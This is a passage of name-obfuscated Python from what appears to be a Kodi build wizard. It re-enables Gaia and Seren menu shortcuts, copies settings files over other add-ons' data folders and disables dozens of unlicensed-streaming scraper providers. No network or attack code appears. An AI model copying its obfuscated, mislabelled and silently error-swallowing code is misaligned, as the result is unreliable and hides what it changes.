    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1216
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1217
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1235
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1238
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1239
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1243
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1244
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1245
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1263
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1266
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1267
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1271
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1272
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1273
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1291
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1294
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1295
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1298
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1299
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1300
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1318
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1321
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1322
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1324
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1325
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1326
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1344
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1347
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1348
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1350
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1351
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1352
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1370
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1373
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1374
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1377
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1378
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1379
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1397
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1400
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1401
def rdbuildinstallON ():#line:1404
    try :#line:1406
       OO0000000O0OOO000 =ADDONPATH +"/resources/rd/victory.xml"#line:1407
       O0000000000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1408
       copyfile (OO0000000O0OOO000 ,O0000000000OOOOOO )#line:1410
       OO0000000O0OOO000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1412
       O0000000000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1413
       copyfile (OO0000000O0OOO000 ,O0000000000OOOOOO )#line:1415
       OO0000000O0OOO000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1417
       O0000000000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1418
       copyfile (OO0000000O0OOO000 ,O0000000000OOOOOO )#line:1420
       OO0000000O0OOO000 =ADDONPATH +"/resources/rd/Splash.png"#line:1423
       O0000000000OOOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1424
       copyfile (OO0000000O0OOO000 ,O0000000000OOOOOO )#line:1426
    except :#line:1428
       pass #line:1429
def rdbuild ():#line:1439
	O00OO0OOOOO00OOOO =(ADDON .getSetting ("auto_rd"))#line:1440
	if O00OO0OOOOO00OOOO =='true':#line:1441
		OO000OOOOOOO00000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1442
		OO000OOOOOOO00000 .setSetting ('all_t','0')#line:1443
		OO000OOOOOOO00000 .setSetting ('rd_menu_enable','false')#line:1444
		OO000OOOOOOO00000 .setSetting ('magnet_bay','false')#line:1445
		OO000OOOOOOO00000 .setSetting ('magnet_extra','false')#line:1446
		OO000OOOOOOO00000 .setSetting ('rd_only','false')#line:1447
		OO000OOOOOOO00000 .setSetting ('ftp','false')#line:1449
		OO000OOOOOOO00000 .setSetting ('fp','false')#line:1450
		OO000OOOOOOO00000 .setSetting ('filter_fp','false')#line:1451
		OO000OOOOOOO00000 .setSetting ('fp_size_en','false')#line:1452
		OO000OOOOOOO00000 .setSetting ('afdah','false')#line:1453
		OO000OOOOOOO00000 .setSetting ('ap2s','false')#line:1454
		OO000OOOOOOO00000 .setSetting ('cin','false')#line:1455
		OO000OOOOOOO00000 .setSetting ('clv','false')#line:1456
		OO000OOOOOOO00000 .setSetting ('cmv','false')#line:1457
		OO000OOOOOOO00000 .setSetting ('dl20','false')#line:1458
		OO000OOOOOOO00000 .setSetting ('esc','false')#line:1459
		OO000OOOOOOO00000 .setSetting ('extra','false')#line:1460
		OO000OOOOOOO00000 .setSetting ('film','false')#line:1461
		OO000OOOOOOO00000 .setSetting ('fre','false')#line:1462
		OO000OOOOOOO00000 .setSetting ('fxy','false')#line:1463
		OO000OOOOOOO00000 .setSetting ('genv','false')#line:1464
		OO000OOOOOOO00000 .setSetting ('getgo','false')#line:1465
		OO000OOOOOOO00000 .setSetting ('gold','false')#line:1466
		OO000OOOOOOO00000 .setSetting ('gona','false')#line:1467
		OO000OOOOOOO00000 .setSetting ('hdmm','false')#line:1468
		OO000OOOOOOO00000 .setSetting ('hdt','false')#line:1469
		OO000OOOOOOO00000 .setSetting ('icy','false')#line:1470
		OO000OOOOOOO00000 .setSetting ('ind','false')#line:1471
		OO000OOOOOOO00000 .setSetting ('iwi','false')#line:1472
		OO000OOOOOOO00000 .setSetting ('jen_free','false')#line:1473
		OO000OOOOOOO00000 .setSetting ('kiss','false')#line:1474
		OO000OOOOOOO00000 .setSetting ('lavin','false')#line:1475
		OO000OOOOOOO00000 .setSetting ('los','false')#line:1476
		OO000OOOOOOO00000 .setSetting ('m4u','false')#line:1477
		OO000OOOOOOO00000 .setSetting ('mesh','false')#line:1478
		OO000OOOOOOO00000 .setSetting ('mf','false')#line:1479
		OO000OOOOOOO00000 .setSetting ('mkvc','false')#line:1480
		OO000OOOOOOO00000 .setSetting ('mjy','false')#line:1481
		OO000OOOOOOO00000 .setSetting ('hdonline','false')#line:1482
		OO000OOOOOOO00000 .setSetting ('moviex','false')#line:1483
		OO000OOOOOOO00000 .setSetting ('mpr','false')#line:1484
		OO000OOOOOOO00000 .setSetting ('mvg','false')#line:1485
		OO000OOOOOOO00000 .setSetting ('mvl','false')#line:1486
		OO000OOOOOOO00000 .setSetting ('mvs','false')#line:1487
		OO000OOOOOOO00000 .setSetting ('myeg','false')#line:1488
		OO000OOOOOOO00000 .setSetting ('ninja','false')#line:1489
		OO000OOOOOOO00000 .setSetting ('odb','false')#line:1490
		OO000OOOOOOO00000 .setSetting ('ophd','false')#line:1491
		OO000OOOOOOO00000 .setSetting ('pks','false')#line:1492
		OO000OOOOOOO00000 .setSetting ('prf','false')#line:1493
		OO000OOOOOOO00000 .setSetting ('put18','false')#line:1494
		OO000OOOOOOO00000 .setSetting ('req','false')#line:1495
		OO000OOOOOOO00000 .setSetting ('rftv','false')#line:1496
		OO000OOOOOOO00000 .setSetting ('rltv','false')#line:1497
		OO000OOOOOOO00000 .setSetting ('sc','false')#line:1498
		OO000OOOOOOO00000 .setSetting ('seehd','false')#line:1499
		OO000OOOOOOO00000 .setSetting ('showbox','false')#line:1500
		OO000OOOOOOO00000 .setSetting ('shuid','false')#line:1501
		OO000OOOOOOO00000 .setSetting ('sil_gh','false')#line:1502
		OO000OOOOOOO00000 .setSetting ('spv','false')#line:1503
		OO000OOOOOOO00000 .setSetting ('subs','false')#line:1504
		OO000OOOOOOO00000 .setSetting ('tvs','false')#line:1505
		OO000OOOOOOO00000 .setSetting ('tw','false')#line:1506
		OO000OOOOOOO00000 .setSetting ('upto','false')#line:1507
		OO000OOOOOOO00000 .setSetting ('vel','false')#line:1508
		OO000OOOOOOO00000 .setSetting ('vex','false')#line:1509
		OO000OOOOOOO00000 .setSetting ('vidc','false')#line:1510
		OO000OOOOOOO00000 .setSetting ('w4hd','false')#line:1511
		OO000OOOOOOO00000 .setSetting ('wav','false')#line:1512
		OO000OOOOOOO00000 .setSetting ('wf','false')#line:1513
		OO000OOOOOOO00000 .setSetting ('wse','false')#line:1514
		OO000OOOOOOO00000 .setSetting ('wss','false')#line:1515
		OO000OOOOOOO00000 .setSetting ('wsse','false')#line:1516
		OO000OOOOOOO00000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1517
		OO000OOOOOOO00000 .setSetting ('debrid.only','true')#line:1518
		OO000OOOOOOO00000 .setSetting ('hosts.captcha','false')#line:1519
		OO000OOOOOOO00000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1520
		OO000OOOOOOO00000 .setSetting ('provider.123moviehd','false')#line:1521
		OO000OOOOOOO00000 .setSetting ('provider.300mbdownload','false')#line:1522
		OO000OOOOOOO00000 .setSetting ('provider.alltube','false')#line:1523
		OO000OOOOOOO00000 .setSetting ('provider.allucde','false')#line:1524
		OO000OOOOOOO00000 .setSetting ('provider.animebase','false')#line:1525
		OO000OOOOOOO00000 .setSetting ('provider.animeloads','false')#line:1526
		OO000OOOOOOO00000 .setSetting ('provider.animetoon','false')#line:1527
		OO000OOOOOOO00000 .setSetting ('provider.bnwmovies','false')#line:1528
		OO000OOOOOOO00000 .setSetting ('provider.boxfilm','false')#line:1529
		OO000OOOOOOO00000 .setSetting ('provider.bs','false')#line:1530
		OO000OOOOOOO00000 .setSetting ('provider.cartoonhd','false')#line:1531
		OO000OOOOOOO00000 .setSetting ('provider.cdahd','false')#line:1532
		OO000OOOOOOO00000 .setSetting ('provider.cdax','false')#line:1533
		OO000OOOOOOO00000 .setSetting ('provider.cine','false')#line:1534
		OO000OOOOOOO00000 .setSetting ('provider.cinenator','false')#line:1535
		OO000OOOOOOO00000 .setSetting ('provider.cmovieshdbz','false')#line:1536
		OO000OOOOOOO00000 .setSetting ('provider.coolmoviezone','false')#line:1537
		OO000OOOOOOO00000 .setSetting ('provider.ddl','false')#line:1538
		OO000OOOOOOO00000 .setSetting ('provider.deepmovie','false')#line:1539
		OO000OOOOOOO00000 .setSetting ('provider.ekinomaniak','false')#line:1540
		OO000OOOOOOO00000 .setSetting ('provider.ekinotv','false')#line:1541
		OO000OOOOOOO00000 .setSetting ('provider.filiser','false')#line:1542
		OO000OOOOOOO00000 .setSetting ('provider.filmpalast','false')#line:1543
		OO000OOOOOOO00000 .setSetting ('provider.filmwebbooster','false')#line:1544
		OO000OOOOOOO00000 .setSetting ('provider.filmxy','false')#line:1545
		OO000OOOOOOO00000 .setSetting ('provider.fmovies','false')#line:1546
		OO000OOOOOOO00000 .setSetting ('provider.foxx','false')#line:1547
		OO000OOOOOOO00000 .setSetting ('provider.freefmovies','false')#line:1548
		OO000OOOOOOO00000 .setSetting ('provider.freeputlocker','false')#line:1549
		OO000OOOOOOO00000 .setSetting ('provider.furk','false')#line:1550
		OO000OOOOOOO00000 .setSetting ('provider.gamatotv','false')#line:1551
		OO000OOOOOOO00000 .setSetting ('provider.gogoanime','false')#line:1552
		OO000OOOOOOO00000 .setSetting ('provider.gowatchseries','false')#line:1553
		OO000OOOOOOO00000 .setSetting ('provider.hackimdb','false')#line:1554
		OO000OOOOOOO00000 .setSetting ('provider.hdfilme','false')#line:1555
		OO000OOOOOOO00000 .setSetting ('provider.hdmto','false')#line:1556
		OO000OOOOOOO00000 .setSetting ('provider.hdpopcorns','false')#line:1557
		OO000OOOOOOO00000 .setSetting ('provider.hdstreams','false')#line:1558
		OO000OOOOOOO00000 .setSetting ('provider.horrorkino','false')#line:1560
		OO000OOOOOOO00000 .setSetting ('provider.iitv','false')#line:1561
		OO000OOOOOOO00000 .setSetting ('provider.iload','false')#line:1562
		OO000OOOOOOO00000 .setSetting ('provider.iwaatch','false')#line:1563
		OO000OOOOOOO00000 .setSetting ('provider.kinodogs','false')#line:1564
		OO000OOOOOOO00000 .setSetting ('provider.kinoking','false')#line:1565
		OO000OOOOOOO00000 .setSetting ('provider.kinow','false')#line:1566
		OO000OOOOOOO00000 .setSetting ('provider.kinox','false')#line:1567
		OO000OOOOOOO00000 .setSetting ('provider.lichtspielhaus','false')#line:1568
		OO000OOOOOOO00000 .setSetting ('provider.liomenoi','false')#line:1569
		OO000OOOOOOO00000 .setSetting ('provider.magnetdl','false')#line:1572
		OO000OOOOOOO00000 .setSetting ('provider.megapelistv','false')#line:1573
		OO000OOOOOOO00000 .setSetting ('provider.movie2k-ac','false')#line:1574
		OO000OOOOOOO00000 .setSetting ('provider.movie2k-ag','false')#line:1575
		OO000OOOOOOO00000 .setSetting ('provider.movie2z','false')#line:1576
		OO000OOOOOOO00000 .setSetting ('provider.movie4k','false')#line:1577
		OO000OOOOOOO00000 .setSetting ('provider.movie4kis','false')#line:1578
		OO000OOOOOOO00000 .setSetting ('provider.movieneo','false')#line:1579
		OO000OOOOOOO00000 .setSetting ('provider.moviesever','false')#line:1580
		OO000OOOOOOO00000 .setSetting ('provider.movietown','false')#line:1581
		OO000OOOOOOO00000 .setSetting ('provider.mvrls','false')#line:1583
		OO000OOOOOOO00000 .setSetting ('provider.netzkino','false')#line:1584
		OO000OOOOOOO00000 .setSetting ('provider.odb','false')#line:1585
		OO000OOOOOOO00000 .setSetting ('provider.openkatalog','false')#line:1586
		OO000OOOOOOO00000 .setSetting ('provider.ororo','false')#line:1587
		OO000OOOOOOO00000 .setSetting ('provider.paczamy','false')#line:1588
		OO000OOOOOOO00000 .setSetting ('provider.peliculasdk','false')#line:1589
		OO000OOOOOOO00000 .setSetting ('provider.pelisplustv','false')#line:1590
		OO000OOOOOOO00000 .setSetting ('provider.pepecine','false')#line:1591
		OO000OOOOOOO00000 .setSetting ('provider.primewire','false')#line:1592
		OO000OOOOOOO00000 .setSetting ('provider.projectfreetv','false')#line:1593
		OO000OOOOOOO00000 .setSetting ('provider.proxer','false')#line:1594
		OO000OOOOOOO00000 .setSetting ('provider.pureanime','false')#line:1595
		OO000OOOOOOO00000 .setSetting ('provider.putlocker','false')#line:1596
		OO000OOOOOOO00000 .setSetting ('provider.putlockerfree','false')#line:1597
		OO000OOOOOOO00000 .setSetting ('provider.reddit','false')#line:1598
		OO000OOOOOOO00000 .setSetting ('provider.cartoonwire','false')#line:1599
		OO000OOOOOOO00000 .setSetting ('provider.seehd','false')#line:1600
		OO000OOOOOOO00000 .setSetting ('provider.segos','false')#line:1601
		OO000OOOOOOO00000 .setSetting ('provider.serienstream','false')#line:1602
		OO000OOOOOOO00000 .setSetting ('provider.series9','false')#line:1603
		OO000OOOOOOO00000 .setSetting ('provider.seriesever','false')#line:1604
		OO000OOOOOOO00000 .setSetting ('provider.seriesonline','false')#line:1605
		OO000OOOOOOO00000 .setSetting ('provider.seriespapaya','false')#line:1606
		OO000OOOOOOO00000 .setSetting ('provider.sezonlukdizi','false')#line:1607
		OO000OOOOOOO00000 .setSetting ('provider.solarmovie','false')#line:1608
		OO000OOOOOOO00000 .setSetting ('provider.solarmoviez','false')#line:1609
		OO000OOOOOOO00000 .setSetting ('provider.stream-to','false')#line:1610
		OO000OOOOOOO00000 .setSetting ('provider.streamdream','false')#line:1611
		OO000OOOOOOO00000 .setSetting ('provider.streamflix','false')#line:1612
		OO000OOOOOOO00000 .setSetting ('provider.streamit','false')#line:1613
		OO000OOOOOOO00000 .setSetting ('provider.swatchseries','false')#line:1614
		OO000OOOOOOO00000 .setSetting ('provider.szukajkatv','false')#line:1615
		OO000OOOOOOO00000 .setSetting ('provider.tainiesonline','false')#line:1616
		OO000OOOOOOO00000 .setSetting ('provider.tainiomania','false')#line:1617
		OO000OOOOOOO00000 .setSetting ('provider.tata','false')#line:1620
		OO000OOOOOOO00000 .setSetting ('provider.trt','false')#line:1621
		OO000OOOOOOO00000 .setSetting ('provider.tvbox','false')#line:1622
		OO000OOOOOOO00000 .setSetting ('provider.ultrahd','false')#line:1623
		OO000OOOOOOO00000 .setSetting ('provider.video4k','false')#line:1624
		OO000OOOOOOO00000 .setSetting ('provider.vidics','false')#line:1625
		OO000OOOOOOO00000 .setSetting ('provider.view4u','false')#line:1626
		OO000OOOOOOO00000 .setSetting ('provider.watchseries','false')#line:1627
		OO000OOOOOOO00000 .setSetting ('provider.xrysoi','false')#line:1628
		OO000OOOOOOO00000 .setSetting ('provider.library','false')#line:1629
def fixfont ():#line:1632
	OO00O0OO00O00O00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1633
	O000OOO0OO0000O0O =json .loads (OO00O0OO00O00O00O );#line:1635
	OOO00O00OOOO000OO =O000OOO0OO0000O0O ["result"]["settings"]#line:1636
	O00O00OO00OO0OOOO =[OO0O00000OOOO0OO0 for OO0O00000OOOO0OO0 in OOO00O00OOOO000OO if OO0O00000OOOO0OO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1638
	O0OO00O00OOO0OO00 =O00O00OO00OO0OOOO ["options"];#line:1639
	OOO000O0OO0000O00 =O00O00OO00OO0OOOO ["value"];#line:1640
	OOO00O0O0000O000O =[O00O00O0OO00OOOOO for (O00O00O0OO00OOOOO ,OOO000OOO0000O00O )in enumerate (O0OO00O00OOO0OO00 )if OOO000OOO0000O00O ["value"]==OOO000O0OO0000O00 ][0 ];#line:1642
	OO0OOOO0000O0OOOO =(OOO00O0O0000O000O +1 )%len (O0OO00O00OOO0OO00 )#line:1644
	OOO0O0OO00O0O0OOO =O0OO00O00OOO0OO00 [OO0OOOO0000O0OOOO ]["value"]#line:1646
	O0OO00OOOOOOOOO00 =O0OO00O00OOO0OO00 [OO0OOOO0000O0OOOO ]["label"]#line:1647
	O0O0OOOO00O0O0O0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1649
	try :#line:1651
		O000OOO000000000O =json .loads (O0O0OOOO00O0O0O0O );#line:1652
		if O000OOO000000000O ["result"]!=True :#line:1654
			raise Exception #line:1655
	except :#line:1656
		sys .stderr .write ("Error switching audio output device")#line:1657
		raise Exception #line:1658
def parseDOM2 (OOO0O000O0OO0000O ,name =u"",attrs ={},ret =False ):#line:1659
	if isinstance (OOO0O000O0OO0000O ,str ):#line:1662
		try :#line:1663
			OOO0O000O0OO0000O =[OOO0O000O0OO0000O .decode ("utf-8")]#line:1664
		except :#line:1665
			OOO0O000O0OO0000O =[OOO0O000O0OO0000O ]#line:1666
	elif isinstance (OOO0O000O0OO0000O ,unicode ):#line:1667
		OOO0O000O0OO0000O =[OOO0O000O0OO0000O ]#line:1668
	elif not isinstance (OOO0O000O0OO0000O ,list ):#line:1669
		return u""#line:1670
	if not name .strip ():#line:1672
		return u""#line:1673
	O0OOOOO000OO0OOOO =[]#line:1675
	for O0O00OO00OOOOOOO0 in OOO0O000O0OO0000O :#line:1676
		O00O0O0O000O0O0O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0O00OO00OOOOOOO0 )#line:1677
		for OOOOOOOOOOO000O00 in O00O0O0O000O0O0O0 :#line:1678
			O0O00OO00OOOOOOO0 =O0O00OO00OOOOOOO0 .replace (OOOOOOOOOOO000O00 ,OOOOOOOOOOO000O00 .replace ("\n"," "))#line:1679
		O00O00000O0O0O0OO =[]#line:1681
		for O0O00OO0OOOO0O0O0 in attrs :#line:1682
			O00O0000O0O0OOO00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00OO0OOOO0O0O0 +'=[\'"]'+attrs [O0O00OO0OOOO0O0O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0O00OO00OOOOOOO0 )#line:1683
			if len (O00O0000O0O0OOO00 )==0 and attrs [O0O00OO0OOOO0O0O0 ].find (" ")==-1 :#line:1684
				O00O0000O0O0OOO00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00OO0OOOO0O0O0 +'='+attrs [O0O00OO0OOOO0O0O0 ]+'.*?>))',re .M |re .S ).findall (O0O00OO00OOOOOOO0 )#line:1685
			if len (O00O00000O0O0O0OO )==0 :#line:1687
				O00O00000O0O0O0OO =O00O0000O0O0OOO00 #line:1688
				O00O0000O0O0OOO00 =[]#line:1689
			else :#line:1690
				O0OO0O00000O0OO00 =range (len (O00O00000O0O0O0OO ))#line:1691
				O0OO0O00000O0OO00 .reverse ()#line:1692
				for OO00OO000000OOO0O in O0OO0O00000O0OO00 :#line:1693
					if not O00O00000O0O0O0OO [OO00OO000000OOO0O ]in O00O0000O0O0OOO00 :#line:1694
						del (O00O00000O0O0O0OO [OO00OO000000OOO0O ])#line:1695
		if len (O00O00000O0O0O0OO )==0 and attrs =={}:#line:1697
			O00O00000O0O0O0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0O00OO00OOOOOOO0 )#line:1698
			if len (O00O00000O0O0O0OO )==0 :#line:1699
				O00O00000O0O0O0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0O00OO00OOOOOOO0 )#line:1700
		if isinstance (ret ,str ):#line:1702
			O00O0000O0O0OOO00 =[]#line:1703
			for OOOOOOOOOOO000O00 in O00O00000O0O0O0OO :#line:1704
				O000OO0O0OO00O00O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOOOOOOOO000O00 )#line:1705
				if len (O000OO0O0OO00O00O )==0 :#line:1706
					O000OO0O0OO00O00O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOOOOOOOO000O00 )#line:1707
				for O0OOOOO0O0000O00O in O000OO0O0OO00O00O :#line:1708
					O0O00000OOO0O0OO0 =O0OOOOO0O0000O00O [0 ]#line:1709
					if O0O00000OOO0O0OO0 in "'\"":#line:1710
						if O0OOOOO0O0000O00O .find ('='+O0O00000OOO0O0OO0 ,O0OOOOO0O0000O00O .find (O0O00000OOO0O0OO0 ,1 ))>-1 :#line:1711
							O0OOOOO0O0000O00O =O0OOOOO0O0000O00O [:O0OOOOO0O0000O00O .find ('='+O0O00000OOO0O0OO0 ,O0OOOOO0O0000O00O .find (O0O00000OOO0O0OO0 ,1 ))]#line:1712
						if O0OOOOO0O0000O00O .rfind (O0O00000OOO0O0OO0 ,1 )>-1 :#line:1714
							O0OOOOO0O0000O00O =O0OOOOO0O0000O00O [1 :O0OOOOO0O0000O00O .rfind (O0O00000OOO0O0OO0 )]#line:1715
					else :#line:1716
						if O0OOOOO0O0000O00O .find (" ")>0 :#line:1717
							O0OOOOO0O0000O00O =O0OOOOO0O0000O00O [:O0OOOOO0O0000O00O .find (" ")]#line:1718
						elif O0OOOOO0O0000O00O .find ("/")>0 :#line:1719
							O0OOOOO0O0000O00O =O0OOOOO0O0000O00O [:O0OOOOO0O0000O00O .find ("/")]#line:1720
						elif O0OOOOO0O0000O00O .find (">")>0 :#line:1721
							O0OOOOO0O0000O00O =O0OOOOO0O0000O00O [:O0OOOOO0O0000O00O .find (">")]#line:1722
					O00O0000O0O0OOO00 .append (O0OOOOO0O0000O00O .strip ())#line:1724
